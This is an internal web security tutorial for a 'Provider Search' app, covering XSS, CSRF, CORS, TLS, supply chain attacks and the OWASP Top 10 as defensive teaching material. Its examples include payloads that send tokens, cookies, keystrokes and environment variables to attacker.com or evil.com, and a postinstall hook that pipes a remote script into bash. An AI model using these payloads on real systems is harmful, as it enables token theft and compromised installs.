# Web Security Fundamentals

## Table of Contents
- [Introduction](#introduction)
- [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
  - [What is XSS?](#what-is-xss)
  - [Types of XSS](#types-of-xss)
  - [Real Examples](#real-examples)
  - [Prevention](#prevention)
  - [Why This Matters for Provider Search](#why-this-matters-for-provider-search)
- [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
  - [What is CSRF?](#what-is-csrf)
  - [How CSRF Works](#how-csrf-works)
  - [CSRF vs XSS](#csrf-vs-xss)
  - [Prevention](#prevention-1)
  - [Why This Matters for Provider Search](#why-this-matters-for-provider-search-1)
- [CORS (Cross-Origin Resource Sharing)](#cors-cross-origin-resource-sharing)
  - [What is CORS?](#what-is-cors)
  - [Why CORS Exists](#why-cors-exists)
  - [How CORS Works](#how-cors-works)
  - [Common Misconfigurations](#common-misconfigurations)
  - [Why This Matters for Provider Search](#why-this-matters-for-provider-search-2)
- [HTTPS/TLS](#httpstls)
  - [What HTTPS Protects](#what-https-protects)
  - [What HTTPS Doesn't Protect](#what-https-doesnt-protect)
  - [How TLS Works](#how-tls-works)
  - [Why This Matters for Provider Search](#why-this-matters-for-provider-search-3)
- [Supply Chain Attacks](#supply-chain-attacks)
  - [What Are Supply Chain Attacks?](#what-are-supply-chain-attacks)
  - [npm/Python Package Risks](#npmpython-package-risks)
  - [Real-World Examples](#real-world-examples)
  - [Prevention Strategies](#prevention-strategies)
  - [Why This Matters for Provider Search](#why-this-matters-for-provider-search-4)
- [OWASP Top 10 Overview](#owasp-top-10-overview)
  - [The 2021 Top 10](#the-2021-top-10)
  - [Relevant to Our Stack](#relevant-to-our-stack)
- [Summary](#summary)

---

## Introduction

Web security isn't about memorizing a list of attacks—it's about understanding **trust boundaries** and **what happens when trust is misplaced**.

Every security vulnerability boils down to:
1. **Trust assumption**: "This input is safe" or "This request came from my app"
2. **Violation**: An attacker breaks that assumption
3. **Impact**: The attacker does something they shouldn't be able to do

Let's explore the core vulnerabilities every web developer must understand.

---

## XSS (Cross-Site Scripting)

### What is XSS?

**Cross-Site Scripting (XSS)** occurs when an attacker injects malicious JavaScript into a web page that other users will view.

**The trust violation**: The browser trusts that any JavaScript in the page came from the legitimate website. If attackers can inject their own JavaScript, the browser executes it with full access to:
- Cookies (if not httpOnly)
- localStorage/sessionStorage
- DOM (entire page structure)
- User actions (keystroke logging, click hijacking)

**First principles**: Browsers have a **same-origin policy**—JavaScript can only access data from the same origin (protocol + domain + port). But if malicious JavaScript runs *within* your origin, it has full access.

### Types of XSS

**1. Stored XSS (Persistent)**
- Attacker stores malicious script in your database
- Every user who views that data executes the script
- **Most dangerous** because it affects all users

Example:
```javascript
// Attacker submits this as their username:
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      token: localStorage.getItem('auth_token'),
      cookies: document.cookie
    })
  })
</script>

// Later, when you render: <div>Welcome, {username}!</div>
// The script executes for every user who sees this profile
```

**2. Reflected XSS**
- Malicious script comes from the current request (usually URL parameters)
- Victim must click a crafted link
- Script reflects back in the response

Example:
```javascript
// URL: https://yourapp.com/search?q=<script>alert(document.cookie)</script>

// If your app renders:
<div>Search results for: {params.q}</div>

// The script executes immediately
```

**3. DOM-based XSS**
- JavaScript reads untrusted data and inserts it into the DOM
- Never touches the server—pure client-side

Example:
```javascript
// Vulnerable React code:
function SearchResults() {
  const query = new URLSearchParams(window.location.search).get('q')
  return <div dangerouslySetInnerHTML={{__html: `Results for: ${query}`}} />
}

// URL: /search?q=<img src=x onerror=alert(1)>
```

### Real Examples

**Example 1: Stealing auth tokens**
```javascript
// Stored in a comment or forum post:
<img src=x onerror="
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: localStorage.getItem('supabase.auth.token')
  })
">
```

**Example 2: Keystroke logger**
```javascript
// Injected script monitors everything the user types:
document.addEventListener('keypress', (e) => {
  fetch('https://attacker.com/keylog', {
    method: 'POST',
    body: e.key
  })
})
```

**Example 3: Session hijacking**
```javascript
// If your auth token is in a non-httpOnly cookie:
<script>
  document.location = 'https://attacker.com/steal?cookie=' + document.cookie
</script>
```

### Prevention

**1. Escape all user input**

React does this automatically:
```javascript
// SAFE - React escapes by default:
<div>{userInput}</div>

// DANGEROUS - dangerouslySetInnerHTML bypasses escaping:
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

**2. Use Content Security Policy (CSP)**

Tell the browser what JavaScript is allowed to execute:
```python
# FastAPI middleware
@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "connect-src 'self' https://api.supabase.co"
    )
    return response
```

**3. Validate input on the backend**
```python
from pydantic import BaseModel, validator

class ProviderCreate(BaseModel):
    name: str
    specialty: str
    
    @validator('name', 'specialty')
    def no_html(cls, v):
        if '<' in v or '>' in v:
            raise ValueError('HTML tags not allowed')
        return v
```

**4. Use httpOnly cookies for sensitive data**
```python
# If storing tokens in cookies (not our approach, but safer):
response.set_cookie(
    key="session_token",
    value=token,
    httponly=True,  # JavaScript cannot access
    secure=True,    # Only sent over HTTPS
    samesite="strict"  # CSRF protection
)
```

### Why This Matters for Provider Search

**Current risk**: We store JWT tokens in localStorage, which XSS can access.

If an attacker finds any XSS vulnerability in our app:
```javascript
// They can steal tokens:
const token = localStorage.getItem('sb-<project>-auth-token')
fetch('https://attacker.com/steal', { method: 'POST', body: token })
```

**Mitigation**:
1. React's automatic escaping protects us (avoid `dangerouslySetInnerHTML`)
2. Validate all provider data before storing (see `api/app/models/provider.py`)
3. Consider CSP headers (not yet implemented)
4. Future: Move to httpOnly cookies (see [03-token-storage-deep-dive.md](./03-token-storage-deep-dive.md))

**Current protection**:
- React automatically escapes rendered data
- Pydantic validates all API inputs
- No use of `dangerouslySetInnerHTML` in our codebase

**Check your code**:
```bash
# Search for dangerous patterns:
cd ~/Repo/provider-search/web
grep -r "dangerouslySetInnerHTML" src/
grep -r "innerHTML" src/
```

---

## CSRF (Cross-Site Request Forgery)

### What is CSRF?

**Cross-Site Request Forgery (CSRF)** tricks a user's browser into making unwanted requests to a site where they're authenticated.

**The trust violation**: Your backend trusts that requests with valid session cookies came from your legitimate frontend. CSRF exploits this by making the victim's browser send authenticated requests from a malicious site.

**First principles**: Browsers automatically attach cookies to requests, even if the request originates from a different site. This is how authentication works—but it's also how CSRF works.

### How CSRF Works

**Scenario**: User is logged into `bank.com`

```
┌─────────────────────────────────────────────────────────┐
│ 1. User logs into bank.com                             │
│    → Browser stores session cookie                      │
└─────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│ 2. User visits evil.com (in another tab)               │
│    → evil.com serves malicious HTML:                    │
│                                                          │
│    <form action="https://bank.com/transfer" method="POST">│
│      <input name="to" value="attacker-account">         │
│      <input name="amount" value="10000">                │
│    </form>                                               │
│    <script>document.forms[0].submit()</script>          │
└─────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│ 3. Browser submits form to bank.com                     │
│    → Automatically attaches session cookie!              │
│    → Bank sees valid session, processes transfer        │
└─────────────────────────────────────────────────────────┘
```

### CSRF vs XSS

| Attack | What's Injected | What's Stolen | Trust Violation |
|--------|----------------|---------------|-----------------|
| **XSS** | Malicious JavaScript into your site | Session tokens, keystrokes, DOM access | "This script came from my site" |
| **CSRF** | Nothing (uses existing session) | Nothing (just performs actions) | "This request came from my site" |

**Key difference**: 
- **XSS** lets attackers run code in your origin (full access)
- **CSRF** just makes the browser send requests (limited actions)

### Prevention

**1. CSRF Tokens (for cookie-based auth)**
```python
# Generate token on login:
csrf_token = secrets.token_urlsafe(32)
session['csrf_token'] = csrf_token

# Include in forms:
<input type="hidden" name="csrf_token" value="{csrf_token}">

# Validate on submission:
if request.form['csrf_token'] != session['csrf_token']:
    raise HTTPException(403, "Invalid CSRF token")
```

**2. SameSite Cookies**
```python
response.set_cookie(
    key="session",
    value=token,
    samesite="strict",  # Don't send cookie on cross-site requests
    httponly=True,
    secure=True
)
```

**3. Custom Headers (our approach)**
```javascript
// Browser won't send custom headers on cross-site requests:
fetch('/api/providers', {
  headers: {
    'Authorization': `Bearer ${token}`,  // Only our frontend can add this
    'X-Requested-With': 'XMLHttpRequest'
  }
})
```

**4. Check Origin/Referer Headers**
```python
@app.middleware("http")
async def validate_origin(request, call_next):
    origin = request.headers.get("origin")
    if request.method in ["POST", "PUT", "DELETE"]:
        if origin and origin not in ALLOWED_ORIGINS:
            return JSONResponse({"error": "Invalid origin"}, status_code=403)
    return await call_next(request)
```

### Why This Matters for Provider Search

**Good news**: We're **already protected** from CSRF!

**Why?**
1. We use **Authorization header** (not cookies) for auth
2. Browsers won't let evil.com add `Authorization: Bearer <token>` to cross-site requests
3. The token is in localStorage, which evil.com cannot access

**Proof**:
```javascript
// This FAILS from evil.com:
fetch('https://provider-search.com/api/providers', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
    // ↑ This localStorage belongs to provider-search.com,
    //   evil.com cannot access it
  }
})
```

**If we used cookies** (future consideration):
```python
# We'd need CSRF protection:
from fastapi_csrf_protect import CsrfProtect

@app.post("/api/providers")
async def create_provider(
    request: Request,
    csrf_protect: CsrfProtect = Depends()
):
    await csrf_protect.validate_csrf(request)
    # ... rest of endpoint
```

**Current implementation**:
- See `web/src/lib/auth.ts` — uses Authorization header
- See `api/app/middleware/auth.py` — validates Bearer token
- No CSRF protection needed because we don't use cookies

---

## CORS (Cross-Origin Resource Sharing)

### What is CORS?

**CORS** is a security mechanism that controls which origins can make requests to your API from a browser.

**First principles**: The **same-origin policy** prevents JavaScript on `evil.com` from making requests to `yourapi.com` and reading the response. CORS allows you to selectively relax this restriction.

### Why CORS Exists

Without same-origin policy:
```javascript
// On evil.com:
fetch('https://yourbank.com/api/account')
  .then(r => r.json())
  .then(data => {
    // I just stole your bank account data!
    fetch('https://attacker.com/steal', { method: 'POST', body: data })
  })
```

**Important**: CORS only affects **browsers**. curl, Postman, and backend code ignore CORS.

### How CORS Works

**Simple request**:
```
Browser: GET /api/providers
Server: Access-Control-Allow-Origin: https://yourfrontend.com
Browser: ✅ Response allowed
```

**Preflight request** (for POST, PUT, DELETE, custom headers):
```
┌────────────────────────────────────────────────────────┐
│ 1. Browser sends OPTIONS request (preflight):         │
│    OPTIONS /api/providers                              │
│    Origin: https://yourfrontend.com                    │
│    Access-Control-Request-Method: POST                 │
│    Access-Control-Request-Headers: Authorization       │
└────────────────────────────────────────────────────────┘
                       ↓
┌────────────────────────────────────────────────────────┐
│ 2. Server responds with allowed origins/methods:      │
│    Access-Control-Allow-Origin: https://yourfrontend.com│
│    Access-Control-Allow-Methods: GET, POST, PUT, DELETE│
│    Access-Control-Allow-Headers: Authorization         │
└────────────────────────────────────────────────────────┘
                       ↓
┌────────────────────────────────────────────────────────┐
│ 3. If allowed, browser sends actual request:          │
│    POST /api/providers                                 │
│    Authorization: Bearer <token>                       │
└────────────────────────────────────────────────────────┘
```

### Common Misconfigurations

**❌ Wildcard with credentials**:
```python
# DANGEROUS - allows any site to make authenticated requests:
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True  # ← This combination is invalid/dangerous
)
```

**❌ Trusting the Origin header**:
```python
# VULNERABLE - attacker controls this header:
origin = request.headers.get("origin")
response.headers["Access-Control-Allow-Origin"] = origin
```

**✅ Explicit allowlist**:
```python
# SAFE - only allow specific origins:
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:5173",  # Dev frontend
        "https://provider-search.com"  # Production frontend
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
)
```

### Why This Matters for Provider Search

**Current implementation**:
```python
# api/app/main.py
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:5173",  # Vite dev server
        "http://localhost:3000",  # Alternative dev port
    ],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Production consideration**:
```python
# Add production origin:
FRONTEND_ORIGIN = os.getenv("FRONTEND_ORIGIN", "http://localhost:5173")
allow_origins = [FRONTEND_ORIGIN]

if os.getenv("ENVIRONMENT") == "development":
    allow_origins.extend([
        "http://localhost:5173",
        "http://localhost:3000",
    ])
```

**Testing CORS**:
```bash
# See scripts/security-demo.sh for live examples
curl -H "Origin: http://localhost:5173" \
     -H "Access-Control-Request-Method: POST" \
     -H "Access-Control-Request-Headers: Authorization" \
     -X OPTIONS \
     http://localhost:8000/api/providers

# Should return Access-Control-Allow-* headers
```

---

## HTTPS/TLS

### What HTTPS Protects

**HTTPS (HTTP over TLS)** encrypts data in transit between client and server.

**It protects against**:
1. **Eavesdropping**: ISPs, WiFi operators, network admins cannot read your traffic
2. **Man-in-the-middle**: Attackers can't intercept and modify requests/responses
3. **Tampering**: Data cannot be changed without detection

**ASCII diagram**:
```
Without HTTPS (HTTP):
┌────────┐  GET /login?user=blake&pass=secret123  ┌────────┐
│ Client │────────────────────────────────────────→│ Server │
└────────┘        Anyone can read this!            └────────┘
     ↑                                                   │
     └───────────────← Session cookie ───────────────────┘
            ISP/WiFi can steal this!

With HTTPS (TLS):
┌────────┐  🔒 encrypted data 🔒  ┌────────┐
│ Client │────────────────────────→│ Server │
└────────┘  Only endpoints can     └────────┘
            decrypt this
```

### What HTTPS Doesn't Protect

**HTTPS does NOT protect against**:
1. **XSS attacks**: If malicious JavaScript runs on your page, it has full access
2. **Compromised servers**: If the server is hacked, HTTPS doesn't help
3. **Phishing**: HTTPS only proves identity of the server, not legitimacy
4. **Malicious extensions**: Browser extensions can read decrypted traffic
5. **Endpoint logging**: Both client and server see plain text

**Example**: HTTPS certificate on a phishing site
```
https://paypa1.com  ← Valid HTTPS, still malicious
                      (notice the "1" instead of "l")
```

### How TLS Works

**Simplified handshake**:
```
1. Client: "Hi, I support these encryption algorithms"
2. Server: "Let's use AES-256. Here's my certificate (public key)"
3. Client: Verifies certificate with Certificate Authority (CA)
4. Client: Generates session key, encrypts with server's public key
5. Server: Decrypts session key with private key
6. Both: Use session key for symmetric encryption (fast)
```

**Certificate chain**:
```
Root CA (trusted by OS/browser)
    ↓ signs
Intermediate CA
    ↓ signs
Your certificate (provider-search.com)
```

### Why This Matters for Provider Search

**Required in production**:
```python
# Enforce HTTPS:
@app.middleware("http")
async def https_redirect(request, call_next):
    if not request.url.scheme == "https":
        url = request.url.replace(scheme="https")
        return RedirectResponse(url, status_code=301)
    return await call_next(request)
```

**HSTS (HTTP Strict Transport Security)**:
```python
# Tell browsers to always use HTTPS:
response.headers["Strict-Transport-Security"] = (
    "max-age=31536000; includeSubDomains"
)
```

**Supabase connection**:
```python
# Supabase uses HTTPS by default:
SUPABASE_URL = "https://<project>.supabase.co"  # Always HTTPS
```

**Development**: 
- localhost uses HTTP (acceptable for dev)
- Production must use HTTPS
- Let's Encrypt provides free certificates

---

## Supply Chain Attacks

### What Are Supply Chain Attacks?

**Supply chain attacks** compromise dependencies (npm packages, Python libraries) that your application trusts.

**The trust violation**: You trust that `npm install some-package` will install legitimate code. Attackers exploit this by:
1. Compromising popular packages
2. Creating malicious packages with similar names (typosquatting)
3. Injecting malware into transitive dependencies

**First principles**: Your app's security is only as strong as your least-secure dependency.

### npm/Python Package Risks

**Example 1: event-stream incident (2018)**
- Popular npm package (2M downloads/week)
- Attacker gained maintainer access
- Injected code to steal cryptocurrency wallet keys
- Affected thousands of applications

**Example 2: Typosquatting**
```bash
# Legitimate:
npm install react-router

# Malicious (one character different):
npm install react-ruter  # Steals environment variables
```

**Example 3: Transitive dependencies**
```
Your app
  └── package-a
       └── package-b
            └── package-c (compromised)
```
You depend on `package-a`, but the vulnerability is 3 levels deep.

### Real-World Examples

**Malicious Python package**:
```python
# Looks legitimate:
import requests

# But setup.py contains:
import os
import http.client

def steal_env():
    data = os.environ
    conn = http.client.HTTPSConnection("attacker.com")
    conn.request("POST", "/steal", str(data))

steal_env()
```

**npm package with malicious postinstall**:
```json
{
  "name": "helpful-package",
  "scripts": {
    "postinstall": "curl https://attacker.com/malware.sh | bash"
  }
}
```

### Prevention Strategies

**1. Audit dependencies regularly**
```bash
# npm:
npm audit
npm audit fix

# Python:
pip-audit
safety check
```

**2. Lock versions**
```bash
# package-lock.json (npm):
npm ci  # Uses exact versions from lockfile

# requirements.txt (Python):
pip freeze > requirements.txt
```

**3. Review new dependencies**
```bash
# Check package info before installing:
npm info <package>
npm view <package> homepage

# Check GitHub stars, issues, last update:
https://github.com/<author>/<package>
```

**4. Use dependency scanning**
```yaml
# GitHub Dependabot (free):
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
```

**5. Minimize dependencies**
```javascript
// ❌ Install a whole library for one function:
import _ from 'lodash'
const unique = _.uniq(array)

// ✅ Use built-in:
const unique = [...new Set(array)]
```

### Why This Matters for Provider Search

**Current dependencies**:
```bash
# Check frontend:
cd ~/Repo/provider-search/web
npm ls --depth=0  # Direct dependencies
npm audit

# Check backend:
cd ~/Repo/provider-search/api
pip list
pip-audit
```

**High-risk areas**:
1. **Frontend** (npm):
   - `react`, `react-router-dom` (widely used, lower risk)
   - Any packages < 1000 stars (higher risk)
   - Packages with single maintainer

2. **Backend** (Python):
   - `fastapi`, `pydantic` (well-maintained)
   - `supabase` (official library)
   - Any niche packages (scrutinize carefully)

**Action items**:
```bash
# Run in CI/CD:
npm audit --audit-level=moderate
pip-audit --strict

# Review lockfiles before committing:
git diff package-lock.json
git diff requirements.txt
```

**Best practices**:
- Review every new dependency (GitHub, downloads, maintainers)
- Prefer established libraries over niche ones
- Run `npm audit` / `pip-audit` weekly
- Set up Dependabot or Snyk for automatic scanning
- Pin major versions (allow patches: `"react": "^18.0.0"`)

---

## OWASP Top 10 Overview

### The 2021 Top 10

The **Open Web Application Security Project (OWASP)** maintains a list of the most critical security risks.

| Rank | Risk | Description | Our Risk Level |
|------|------|-------------|----------------|
| **A01** | **Broken Access Control** | Users can access/modify data they shouldn't | 🔴 High |
| **A02** | **Cryptographic Failures** | Exposing sensitive data due to weak/missing encryption | 🟡 Medium |
| **A03** | **Injection** | SQL, NoSQL, command injection | 🟢 Low (Pydantic/ORM) |
| **A04** | **Insecure Design** | Missing security controls in design phase | 🟡 Medium |
| **A05** | **Security Misconfiguration** | Default passwords, verbose errors, missing headers | 🟡 Medium |
| **A06** | **Vulnerable & Outdated Components** | Using libraries with known vulnerabilities | 🟡 Medium |
| **A07** | **Identification & Authentication Failures** | Weak authentication/session management | 🟢 Low (Supabase) |
| **A08** | **Software & Data Integrity Failures** | CI/CD pipeline vulnerabilities, unsigned packages | 🟡 Medium |
| **A09** | **Security Logging & Monitoring Failures** | Inadequate logging of security events | 🔴 High |
| **A10** | **Server-Side Request Forgery (SSRF)** | Server makes requests to attacker-controlled URLs | 🟢 Low |

### Relevant to Our Stack

**A01: Broken Access Control** 🔴
```python
# ❌ VULNERABLE:
@app.get("/api/providers/{provider_id}")
async def get_provider(provider_id: int):
    return db.query(Provider).filter(Provider.id == provider_id).first()
    # Any user can access any provider!

# ✅ FIXED:
@app.get("/api/providers/{provider_id}")
async def get_provider(
    provider_id: int,
    current_user: User = Depends(get_current_user)
):
    provider = db.query(Provider).filter(
        Provider.id == provider_id,
        Provider.user_id == current_user.id  # ← Verify ownership
    ).first()
    if not provider:
        raise HTTPException(404, "Provider not found")
    return provider
```

**A03: Injection** 🟢
```python
# ✅ PROTECTED - Pydantic + SQLAlchemy prevent SQL injection:
from pydantic import BaseModel

class ProviderQuery(BaseModel):
    specialty: str
    zip_code: str

# SQLAlchemy automatically parameterizes:
providers = db.query(Provider).filter(
    Provider.specialty == query.specialty  # Safe - parameterized
).all()
```

**A05: Security Misconfiguration** 🟡
```python
# ❌ Exposes stack traces in production:
DEBUG = True

# ✅ Environment-specific:
DEBUG = os.getenv("ENVIRONMENT") == "development"

# ❌ Verbose errors:
except Exception as e:
    return {"error": str(e)}  # Might leak paths, credentials

# ✅ Generic errors in production:
except Exception as e:
    logger.error(f"Error: {e}")
    return {"error": "Internal server error"}
```

**A09: Security Logging & Monitoring Failures** 🔴
```python
# ❌ Not logged:
@app.post("/api/login")
async def login(credentials: LoginCredentials):
    # ... authenticate ...
    return {"token": token}

# ✅ Logged:
@app.post("/api/login")
async def login(credentials: LoginCredentials, request: Request):
    logger.info(f"Login attempt: user={credentials.email}, ip={request.client.host}")
    try:
        user = authenticate(credentials)
        logger.info(f"Login success: user_id={user.id}")
        return {"token": generate_token(user)}
    except AuthenticationError:
        logger.warning(f"Login failed: user={credentials.email}, ip={request.client.host}")
        raise HTTPException(401, "Invalid credentials")
```

---

## Summary

### Key Takeaways

1. **XSS**: Inject malicious JavaScript → Steal tokens, log keystrokes
   - **Prevention**: Escape output (React does this), avoid `dangerouslySetInnerHTML`, use CSP

2. **CSRF**: Trick browser into making authenticated requests
   - **Prevention**: Use Authorization headers (not cookies), SameSite cookies, CSRF tokens
   - **Provider Search**: Already protected (Bearer token in header)

3. **CORS**: Control which origins can access your API from browsers
   - **Prevention**: Explicit allowlist, never wildcard with credentials
   - **Provider Search**: Configure for production origin

4. **HTTPS/TLS**: Encrypt data in transit
   - **What it protects**: Eavesdropping, MITM, tampering
   - **What it doesn't**: XSS, server compromises, phishing
   - **Provider Search**: Required in production, use HSTS header

5. **Supply Chain**: Compromised dependencies
   - **Prevention**: Audit regularly, lock versions, review new packages, minimize dependencies
   - **Provider Search**: Run `npm audit` and `pip-audit` weekly

6. **OWASP Top 10**: Focus on access control and logging
   - **A01**: Verify ownership before returning data
   - **A09**: Log all authentication events

### Next Steps

1. Read **[02-authentication-approaches.md](./02-authentication-approaches.md)** to understand different auth strategies
2. Review your code for XSS vulnerabilities: `grep -r "dangerouslySetInnerHTML" ~/Repo/provider-search/web/src/`
3. Run security audits: `cd ~/Repo/provider-search && npm audit && pip-audit`
4. Implement logging for authentication events
5. Plan CSP header implementation
6. Review access control in all API endpoints

### Resources

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **OWASP Cheat Sheets**: https://cheatsheetseries.owasp.org/
- **CSP Evaluator**: https://csp-evaluator.withgoogle.com/
- **npm audit docs**: https://docs.npmjs.com/cli/v8/commands/npm-audit
- **Snyk (dependency scanning)**: https://snyk.io/

---

*Part of the [Provider Search Security & Auth Learning Module](./00-overview.md)*
